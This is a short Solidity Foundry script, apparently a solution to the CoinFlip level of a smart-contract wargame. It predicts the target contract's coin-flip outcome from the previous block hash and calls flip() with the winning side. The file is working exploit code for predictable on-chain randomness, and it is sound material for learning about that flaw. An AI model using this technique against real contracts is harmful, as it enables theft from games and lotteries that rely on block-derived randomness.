// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";

import {CoinFlip} from "../src/CoinFlip.sol";

contract ExploitFlipCoin is Script {
    address private constant INSTANCE_ADDRESS = 0x0392EEdE9bE06Ba5B1D940d735Ad19876C0230E8;
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 private PRIVATE_KEY = vm.envUint("PRIVATE_KEY");

    function run() external {
        vm.startBroadcast(PRIVATE_KEY);
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        CoinFlip(INSTANCE_ADDRESS).flip(side);
        // CoinFlip(INSTANCE_ADDRESS).consecutiveWins();
        vm.stopBroadcast();
    }
}
